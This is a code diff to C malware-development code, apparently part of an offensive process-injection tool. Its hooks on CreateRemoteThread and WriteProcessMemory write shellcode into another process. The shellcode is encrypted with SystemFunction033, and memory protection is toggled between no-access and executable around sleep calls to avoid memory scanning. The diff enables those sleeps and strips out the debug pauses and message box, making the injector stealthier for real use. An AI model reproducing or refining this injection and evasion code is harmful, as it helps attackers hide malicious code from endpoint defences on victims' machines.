@@ -96,7 +96,7 @@ HANDLE hookedCreateRemoteThread(HANDLE hProcess, LPSECURITY_ATTRIBUTES lpThreadA
 
     // Arrives here encrypted and with PAGE_NOACCESS
 
-    //SleepImplant(9520);
+    SleepImplant(9520);
 
     VirtualProtectEx(hProcess, lpStartAddress, 1, PAGE_READWRITE, &old);
 
@@ -121,7 +121,7 @@ HANDLE hookedCreateRemoteThread(HANDLE hProcess, LPSECURITY_ATTRIBUTES lpThreadA
 
     VirtualProtectEx(hProcess, lpStartAddress, 1, PAGE_NOACCESS, &old);
 
-    //SleepImplant(11120);
+    SleepImplant(11120);
 
     VirtualProtectEx(hProcess, lpStartAddress, 1, PAGE_EXECUTE, &old);
 
@@ -136,11 +136,9 @@ HANDLE hookedCreateRemoteThread(HANDLE hProcess, LPSECURITY_ATTRIBUTES lpThreadA
     WriteProcessMemory(hProcess, lpStartAddress, &shellcode, sizeof(shellcode), &bytesRead);
 
     printf("Shellcode Encrypted written in the Address = %p\n", lpStartAddress);
-    getchar();
 
     VirtualProtectEx(hProcess, lpStartAddress, 1, PAGE_NOACCESS, &old);
     printf("Permisions changed to PAGE_NOACCESS\n");
-    getchar();
 
     VirtualProtect(&CreateRemoteThread, 1, PAGE_EXECUTE_READ | PAGE_GUARD, &old);
     return NULL;
@@ -157,7 +155,7 @@ HANDLE hookedWriteProcessMemory(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID l
     // Resolve SystemFunction033 address from advapi32.dll 
     _SystemFunction033 SystemFunction033 = (_SystemFunction033)GetProcAddress(LoadLibraryA("advapi32"), "SystemFunction033");
 
-    MessageBoxA(0, "Hooked WriteProcessMemory", "YAY!", 0);
+    //MessageBoxA(0, "Hooked WriteProcessMemory", "YAY!", 0);
 
     // Encryption with SystemFuncion033
     key.Buffer = (&_key);
@@ -175,7 +173,7 @@ HANDLE hookedWriteProcessMemory(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID l
 
     VirtualProtectEx(hProcess, lpBaseAddress, 1, PAGE_NOACCESS, &old);
 
-    // SleepImplant(9520);
+    SleepImplant(9520);
 
     return NULL;
 }
